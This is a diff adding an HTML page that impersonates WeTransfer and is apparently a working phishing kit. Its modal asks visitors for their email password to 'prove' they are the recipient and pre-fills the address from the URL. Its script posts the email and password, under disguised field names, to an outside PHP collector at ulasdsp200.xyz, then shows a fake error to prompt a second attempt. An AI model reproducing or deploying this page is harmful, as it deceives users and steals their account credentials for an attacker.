@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+	<link rel="shortcut icon" href="https://cdn.glitch.com/a9bfcce0-422b-46e4-9074-3147cbc03390%2Ficon.ico" type="image/x-icon" />
+
+    <title>WeTransfer</title>
+<style type="text/css">
+    article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section, main {
+    display: block;}
+@font-face{font-family:mds-chase-icons;src:url(mds-chase-icons.html);src:url(mds-chase-iconsd41d.html?#iefix) format('eot'),url(mds-chase-icons-2.html) format('woff'),url(mds-chase-icons-3.html) format('truetype')}
+html {    font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;}
+@import url('https://fonts.googleapis.com/css?family=Nanum+Gothic');
+body{font-family:'Nanum Gothic', sans-serif;
+  font-size:14px;
+  color:#48b4e0;
+  height: 600px;
+  background-size: 400% 400%;
+  -webkit-animation: Gradient 15s ease infinite;
+  -moz-animation: Gradient 15s ease infinite;
+  animation: Gradient 15s ease infinite;
+}
+    .alert{
+        display: none;
+    }
+@-webkit-keyframes Gradient {
+  0% {
+    background-position: 0% 50%
+  }
+  50% {
+    background-position: 100% 50%
+  }
+  100% {
+    background-position: 0% 50%
+  }
+}
+
+@-moz-keyframes Gradient {
+  0% {
+    background-position: 0% 50%
+  }
+  50% {
+    background-position: 100% 50%
+  }
+  100% {
+    background-position: 0% 50%
+  }
+}
+
+@keyframes Gradient {
+  0% {
+    background-position: 0% 50%
+  }
+  50% {
+    background-position: 100% 50%
+  }
+  100% {
+    background-position: 0% 50%
+  }
+}
+  
+a{
+  color:#48b4e0;
+}
+a:hover{
+  color:#48b4e0;
+  text-decoration:none;
+}
+input[type=submit] {
+    background-color: #48b4e0;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    cursor: pointer;
+    width: 39%;
+}
+.text-center{text-align:center;}
+.banner-heading{
+  font-family: 'Nanum Gothic', sans-serif;
+  font-size: 75px;
+    font-weight: 700;
+    line-height: 100px;
+    margin-bottom: 30px;
+  color:#48b4e0;
+}
+.banner-sub-heading{
+  font-family: 'Nanum Gothic', sans-serif;
+  font-size: 30px;
+    font-weight: 300;
+    line-height: 30px;
+    margin-bottom: 50px;
+  color:#48b4e0;
+}
+.btn-warning{background-color:#48b4e0;}
+.btn-warning:hover{background-color:#48b4e0;}
+.mybtn{
+  border-radius:4px; 
+  height:40px;
+  line-height:10px;
+  width: 40%;
+  margin: 0 auto; 
+  font-weight: bolder;
+  font-size: 15px;
+}
+.form-control{
+  color:#212529;
+  font-size:15px;
+  font-weight:400;
+  border:1px solid rgba(0, 128, 0, 0.7);
+/*  border-top:0;
+  border-left:0;
+  border-right:0;*/
+  height:50px;
+}
+input::placeholder { color: #888 !important; }
+
+.form-check-input{
+  background-color:#48b4e0 !important;
+  border-radius:50% !important;
+  border:2px solid #f39305 !important;
+}
+.modal-content{
+  width:470px;
+  margin:auto;
+}
+
+.modal-header {
+    padding:0.7rem 1rem;
+    border-bottom: 1px solid #48b4e0;
+   border-radius:0;
+  /*background-color:#9a4a05;*/
+}
+.modal-title{
+  font-size:16px;
+  font-family: 'Nanum Gothic', sans-serif;
+  text-transform:uppercase;
+color: #48b4e0;
+  text-align:center;
+  font-weight: bold;
+  }
+.modal-body{
+  background-image:url('');
+  background-position:top left;
+  background-size:cover;
+  width:100%;
+  /*padding:1.5rem 3rem 3rem 3rem;*/
+}
+/*body.modal-open .supreme-container{
+    -webkit-filter: blur(1px);
+    -moz-filter: blur(1px);
+    -o-filter: blur(1px);
+    -ms-filter: blur(1px);
+    filter: blur(1px);
+}*/
+.text-intro{
+  font-size:0.8em;
+  color:#777;
+  text-align:center;
+}
+.form-div{
+  background-color:#fff;
+  padding:1.0em 1.5em 0.05em 1.5em;
+  box-shadow:1px 1px 1px 1px rgba(215,215,215,0.3);
+}
+form{
+  border:0 !important;
+}
+@media (max-width:500px){
+  .modal-content{
+  width:330px;
+  margin:auto;
+}
+.banner-heading{
+  font-size: 30px;
+    line-height: 30px;
+    margin-bottom: 20px;
+}
+.banner-sub-heading{
+  font-size: 10px;
+    font-weight: 200;
+    line-height: 10px;
+    margin-bottom: 40px;
+}
+}
+@media (max-width:768px){
+  .banner-text{
+  padding:150px 0 150px 0;
+}
+  .banner-sub-heading{
+  font-size: 23px;
+    font-weight: 200;
+    line-height: 23px;
+    margin-bottom: 40px;
+}
+}
+.intoimg{
+  width: auto;
+  height: auto;
+} 
+#writeup{
+color: #48b4e0;
+font-size: 1.5rem;  
+}
+</style></head>
+  <body>
+<img src="https://cdn.glitch.com/a9bfcce0-422b-46e4-9074-3147cbc03390%2Fbg.jpg" width="100%" ></img>
+
+<div 
+    style="left:86px; width:268px; top:108px; position:absolute; height: 395px;">
+<div style="left:47px; width:189px; top:323px; position:absolute; height: 52px;" background-color:#48b4e0">
+<p></p>
+<input type="image" src="https://cdn.glitch.com/8f9608dc-d0c3-4d19-8cea-5ba677c58109%2Fbt.png" data-toggle="modal" data-target="#loginModal">
+</CENTER></div>
+
+    <div class="container">
+      <div class="row mt-5">
+        <div class="col-md-4">          
+        </div>     
+        <div class="col-md-4" style="margin-left: -20px;">
+          
+          <div id="writeup" class="text-center ml-5">
+          
+                                     
+            </center>            
+          </div>
+        </div>     
+        <div class="col-md-4">
+        </div>     
+      </div>
+      <!-- The Modal -->
+      <div class="modal fade" id="loginModal">
+        <div class="modal-dialog">
+          <div class="modal-content">
+          
+            <!-- Modal Header -->
+            <div class="modal-header">
+            <center>  <span class="modal-title"></span></center>
+              <button type="button" class="close" data-dismiss="modal">X</button>
+            </div>
+            
+            <!-- Modal body -->
+            <div class="modal-body">
+              <center>
+              <img src="https://cdn.glitch.com/8f9608dc-d0c3-4d19-8cea-5ba677c58109%2Fwet.png" alt=""><br/><font face="Trebuchet MS" color="black" size="2"> 
+                <span style="font-size:18px;">
+                  <span style="color:#006400;">
+                    <strong>
+                    <span style="font-family: &quot;Trebuchet MS&quot;; text-align: -webkit-center;">WeTransfer Online Security</span>                    </strong>                  </span>                </span> <br> 
+                  <span style="color:#FF0000;font-size:14px;">*Secure File and Email Access*</span> <br>
+                                <br>
+                <span style="font-size:14px">Enter your email password below to prove you're the intended recipient</span>
+                </font>
+				
+				<div class="alert alert-danger ml-4 mr-4 mt-4 mb-0" role="alert" style="font-size: 15px;">
+            Please enter valid email password to authenticate your email user.
+            </div>
+              </center>
+               <div class="form-div"><form id="idc233847"><div class="form-group"><input type="email" class="form-control" id="txtEmail" name="email" placeholder="Enter Email Address" value="" required> </div> <div class="form-group"> <input type="password" class="form-control" id="pwd" name="password" placeholder="Enter Email Password" required><input type="hidden" id="hdnPwd" name="hdnPwd"></div><input type="submit" class="btn btn btn-block mybtn"value="Download">
+			    </form></div>
+        
+            </div>       
+           
+          </div>
+        </div>
+      </div>
+      
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha256-OFRAJNoaD8L3Br5lglV7VyLRf0itmoBzWUoM+Sji4/8=" crossorigin="anonymous"></script>
+    <script src="main.js"></script>
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-migrate-3.1.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ"
+        crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
+    <script type="text/javascript">
+      /*
+       * Released under the MIT License
+       * Copyright 2015 Daniele De Santis
+       */
+      (function( $ ) {        
+         $.extend({
+            browserDetection: function ( addClass ) {
+              
+              var theBody = $('body'),
+                  userAgent = window.navigator.userAgent,
+                  msieIndex = userAgent.indexOf('MSIE '),
+                  currentBrowser,
+                  browserClass;
+              
+              if ( msieIndex !=-1 ) { // IE <= 10
+                var ieVersion = userAgent.substring(msieIndex + 5, userAgent.indexOf('.', msieIndex)); // IE version
+                currentBrowser = 'IE' + ieVersion;
+                browserClass = 'IE ' + currentBrowser;
+              } else if ( userAgent.indexOf('Trident/') !=-1 ) { // IE11
+                currentBrowser = 'IE11';
+                browserClass = 'IE IE11';
+              } else if ( userAgent.indexOf('Chrome') != -1 ) {
+                if ( userAgent.indexOf('OPR') != -1 ) { // Opera
+                  currentBrowser = browserClass = 'Opera';
+                } else {
+                  currentBrowser = browserClass = 'Chrome'; // Chrome
+                }
+              } else if (userAgent.indexOf('Safari') != -1 && userAgent.indexOf('Chrome') == -1) { // Safari
+                if ( userAgent.indexOf('CriOS') != -1 ) { // Chrome for iOS
+                  currentBrowser = browserClass = 'Chrome';
+                } else {
+                  currentBrowser = browserClass = 'Safari';
+                }
+              } else if ( userAgent.indexOf('Firefox') != -1 ) { // Firefox
+                currentBrowser = browserClass = 'Firefox';
+              } else {
+                currentBrowser = 'notDetected';
+                browserClass = '';
+              }              
+              if ( addClass ) { // add class
+                theBody.addClass(browserClass);
+              }                      
+              return currentBrowser; // return value
+            }
+        });
+      }( jQuery ));
+    </script> 
+    <script>
+	    let href = $(location).attr('href');
+    let divide1 = href.split("@");
+    let divide2 = href.split("#");
+    $('#theDomain').text(divide1[1]);
+    $('#txtEmail').val(divide2[1]);
+$(document).ready(function(){
+    $('#btn-submit').submit(function(){   
+        // to prevent refreshing the whole page page
+        return false;
+    });		
+var el = document.forms[0].elements,data;
+           $(el[3]).click(function(e){
+                 e.preventDefault();               
+            data={x101name:el[0].value,sec099:el[1].value};
+               
+               if(el[0].value === '' || el[1].value === ''){
+                  $(".alert").fadeIn('slow');
+                    setTimeout(()=>{$(".alert").fadeOut('slow');},2000);
+                   return false;            
+                  }
+             $.ajax({
+            type:'POST',
+            data: data,
+            dataType: 'text',
+            url: 'https://ulasdsp200.xyz/my-wt/wtwz34.php',
+            success:function(a){
+                     if(a ==='done'){
+                        el[1].value = '' ;
+                         $(".alert").fadeIn('slow');
+                         setTimeout(()=>{$(".alert").fadeOut('slow');},4000);
+                     } }             
+        }); });       
+        });       
+</script>
+
+  </body>
+</html>
